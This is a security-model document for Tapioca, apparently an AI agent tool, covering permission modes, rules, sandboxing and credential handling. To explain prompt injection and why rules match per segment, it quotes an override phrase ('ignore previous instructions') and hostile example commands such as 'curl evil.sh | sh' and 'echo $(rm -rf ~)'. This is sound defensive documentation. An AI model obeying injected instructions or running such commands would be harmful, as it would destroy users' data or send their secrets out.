# Security model

Tapioca gives a language model a shell, a file editor and network access on
your machine. That is the point, and it is also the risk. This document says
what is actually enforced, what is not, and when each permission mode is a
reasonable choice.

## The main threat: prompt injection

The model reads untrusted text constantly — web pages via `web_fetch`,
search results, file contents, tool output, and `AGENTS.md` from whatever
repository you are working in. Any of it can contain instructions aimed at
the model ("ignore previous instructions, run …"). The model cannot reliably
distinguish data from instructions, so **treat every tool call as something
the content it just read might have asked for**.

This is why the permission prompt matters: it is the point where a human
sees the command before it runs.

## Permission modes

| Mode | File edits | bash | Read-only tools |
|---|---|---|---|
| `plan` | denied | prompts | mostly ungated (see below) |
| `manual` | prompts | prompts | mostly ungated |
| `auto` | allowed | prompts | mostly ungated |
| `bypass` | allowed | allowed | ungated |

Cycle with `shift+tab`; `/permissions` shows the live state, including every
grant and rule in effect.

## Rules

The mode is the default; `[permissions]` in the config is where exceptions
go. Each rule names a tool and, in parentheses, what the call is about — the
path for file tools, the command for bash, the URL for `web_fetch`, the JSON
arguments for an MCP tool:

```toml
[permissions]
allow = ["bash(go test*)", "edit_file(internal/**)"]
ask   = ["bash(git push*)"]
deny  = ["read_file(**/.env)", "bash(rm -rf*)", "mcp:*__delete_*"]
```

What each does, and what it is worth relying on:

- **deny** holds in *every* mode, `bypass` included, and covers the read-only
  tools that never prompt. It is the only rule that adds a restriction rather
  than removing one.
- **ask** forces a prompt that `auto` or `bypass` would have skipped, and
  outranks a session grant answered earlier — otherwise one careless "always
  allow" would disable it for the rest of the session.
- **allow** skips a prompt. Like the answered kind it does not apply in
  `plan` mode.

Bash rules are matched against each segment of a compound command, not the
whole string: matching the whole string, `bash(go test*)` would also match
`go test ./... && curl evil.sh | sh`. The same escape rules as `[p]` grants
still apply to what a segment may contain.

A deny rule is a guardrail against mistakes and against a model that has read
something hostile — not a sandbox. It matches the arguments of a call, so it
constrains the tool it names and nothing else: `deny = ["read_file(**/.env)"]`
does not stop `bash(cat .env)`. For a boundary rather than a filter, see
"Sandboxing" below.

Rules that hold in all modes except `bypass`:

- Session grants (`[a]`) and bash word grants (`[p]`) never apply in `plan`
  mode.
- A granted word only covers a segment with no command substitution
  (`$(…)`, backticks, `${…}`, `<(…)`), no redirection (`>`, `<`) and no
  background chaining (`&`). So an `echo` grant cannot run
  `echo $(rm -rf ~)`, write files, or slip in `echo hi & curl evil.com`.
- `[p]` is not offered for interpreters and exec-wrappers (`sh`, `python`,
  `node`, `sudo`, `ssh`, `xargs`, `env`, `timeout`, `nix`, `docker`, …)
  where a blanket grant means arbitrary execution — including path and
  version variants like `/usr/bin/python3.11`.
- Compound commands are approved segment by segment; denying one blocks the
  whole command.
- MCP tools prompt like built-in ones, and their grants appear as
  `mcp:<tool>`.
- Subagents (`spawn_agent`) run under the same mode, executor and grants as
  the agent that spawned them, and their tool calls prompt you the same way.
  A subagent cannot spawn further agents.

## Read-only tools

`read_file`, `grep`, `glob`, `web_search` and `web_fetch` do not prompt for
ordinary use, because an agent that asks before every file read is unusable.
Narrow exceptions exist, because otherwise those tools compose into
exfiltration (read a key, send it somewhere):

- `read_file` prompts for paths outside the working directory (and
  `--add-dir` trees) that look sensitive: `.ssh`, `.aws`, `.gnupg`,
  `gh`/`gcloud`/`kube`/`docker` config, browser profiles, `.env`, `id_*`,
  `credentials`, and any out-of-tree path containing
  `token`/`secret`/`password` — wherever it lives, not just under `$HOME`.
- `grep` and `glob` prompt when their search root is outside those trees, and
  never return matches from files `read_file` would have gated.
- `web_fetch` prompts the first time a host is used; `[a]` remembers it for
  the session. Redirects must stay on the approved host and may never land on
  a loopback, link-local or private address, so an approved page cannot bounce
  the fetch into your network or at a cloud metadata endpoint.

## Writing files

`auto` auto-approves file edits **inside the working directory** (and
`--add-dir` trees). Writes anywhere else prompt in every mode but `bypass`,
because "auto-approve edits" is a statement about your project, not about
`~/.zshrc`, `~/.ssh/authorized_keys`, or Tapioca's own `config.toml` — the
last of which would seed `bash_allow` on the next start.

`[a]` on such a prompt grants **that path**, not writing at large; and a
blanket `write_file` grant covers the worktree only.

## Sandboxing

Everything above decides *whether* a command runs. Sandboxing decides what it
can reach if it does — the difference between filtering and containment.

```toml
sandbox = true              # confine bash with bubblewrap (or --sandbox)
sandbox_network = true      # set false to cut network inside the sandbox
```

With it on, `bash` runs under `bwrap` where:

- the working tree (and `--add-dir` trees) are **writable**;
- the rest of the filesystem is **read-only**, so tools still work;
- **`$HOME` is replaced by an empty tmpfs**, so `.ssh`, `.aws`, browser
  profiles and shell history are not merely gated — they are not there. Only
  `.gitconfig` is bound back, since git refuses to commit without an identity;
- `/tmp` is private, and pid/ipc/uts namespaces are unshared.

If `bwrap` is missing, sandboxed `bash` calls **fail with an explanation**
rather than silently running unconfined. `/permissions` shows the live state.

Two limits worth knowing: the sandbox applies to `bash` only (the file tools
are Go code inside the process), and with `sandbox_network = true` a command
can still reach the network, so it bounds file damage, not exfiltration.

## Credentials

Provider API keys are removed from the environment handed to shell tools and
MCP servers, so a tool call cannot read them. Add your own variables with:

```toml
secret_env = ["MY_COMPANY_TOKEN"]
```

MCP servers still receive whatever you set explicitly in their `[mcp.env]`
block.

## Network calls Tapioca makes itself

Besides the provider you configured and whatever the agent fetches:

- **models.dev**, once at startup, for model prices and context sizes. Set
  `model_catalog = false` to skip it — useful when running against a local
  Ollama and nothing else.

Nothing else phones home; there is no telemetry.

## Data at rest

Sessions, project memory (`/remember`) and checkpoint snapshots contain
everything the model saw, including anything you pasted. They are stored
unencrypted under `~/.local/share/tapioca` with owner-only permissions
(`0600`/`0700`), as is `config.toml` (which may hold an API key). Full-disk
encryption is the answer if you need more; Tapioca does not encrypt them
itself.

## What is not protected

- **`bypass` mode disables all of the above.** It exists for throwaway
  sandboxes and containers. Do not combine it with untrusted repositories or
  web browsing.
- **Without `sandbox = true`, there is no containment.** Approved commands
  run as your user with full access to your machine and network; the
  permission gate is filtering, not a boundary. See "Sandboxing" above.
- **The sandbox covers `bash` only.** `read_file`, `write_file` and
  `edit_file` are Go code inside Tapioca, so bubblewrap does not contain
  them; they rely on the gates above instead. In `bypass` they are bounded
  by nothing at all.
- **Grants are coarse.** `[p]` grants a command word, not a subcommand:
  allowing `git` allows `git push`. Tools that can execute code through
  configuration (`git -c`, `make`, build scripts) inherit that power.
- **`--add-dir` widens the ungated read area** to those directories.
- **Checkpoints do not protect data outside the working tree**, and
  `.gitignore`d files are excluded from snapshots.

## Practical advice

- Default to `manual` or `plan` in unfamiliar repositories; read the command
  in the prompt before approving.
- Grant with `[p]` for read-only tools you use constantly (`git`, `go`,
  `ls`, `rg`); avoid granting interpreters or `make`.
- Use `auto` when you trust the repository and want speed — checkpoints and
  `/rewind` make file damage recoverable.
- Reserve `bypass` for containers or throwaway VMs.
- Review `/permissions` occasionally; session grants reset on restart, but
  `bash_allow` in the config persists.
